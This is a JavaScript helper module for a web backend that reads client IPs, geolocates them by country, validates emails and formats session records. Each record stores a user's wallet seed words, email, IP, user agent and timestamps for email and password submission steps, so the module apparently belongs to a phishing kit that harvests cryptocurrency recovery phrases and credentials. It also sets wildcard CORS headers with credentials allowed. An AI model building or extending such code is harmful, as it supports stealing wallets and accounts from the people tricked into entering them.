import geoip from 'geoip-lite'

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/i

export const normalizeIp = (ipAddress) => {
  if (!ipAddress) return null
  if (ipAddress === '::1') return '127.0.0.1'
  if (ipAddress.startsWith('::ffff:')) return ipAddress.slice(7)
  return ipAddress
}

export const getClientIp = (req) => {
  const forwarded = req.headers['x-forwarded-for']
  if (Array.isArray(forwarded)) {
    return normalizeIp(forwarded[0])
  }
  if (typeof forwarded === 'string' && forwarded.length > 0) {
    const [first] = forwarded.split(',')
    return normalizeIp(first.trim())
  }
  return normalizeIp(req.connection?.remoteAddress)
}

export const getCountryFromIp = (ipAddress) => {
  if (!ipAddress) return 'Unknown'
  const lookup = geoip.lookup(ipAddress)
  return lookup?.country ?? 'Unknown'
}

export const validateEmail = (email) => {
  return emailRegex.test(email)
}

export const formatSession = (session) => {
  return {
    sessionId: session._id.toString(),
    status: session.status,
    seedWords: session.seedWords,
    email: session.email,
    ipAddress: session.ipAddress,
    country: session.country,
    userAgent: session.userAgent,
    createdAt: session.createdAt,
    emailSubmittedAt: session.emailSubmittedAt,
    emailRequestedAt: session.emailRequestedAt,
    passwordSubmittedAt: session.passwordSubmittedAt,
    passwordRequestedAt: session.passwordRequestedAt
  }
}

export const setCorsHeaders = (res) => {
  res.setHeader('Access-Control-Allow-Credentials', true)
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT')
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version')
}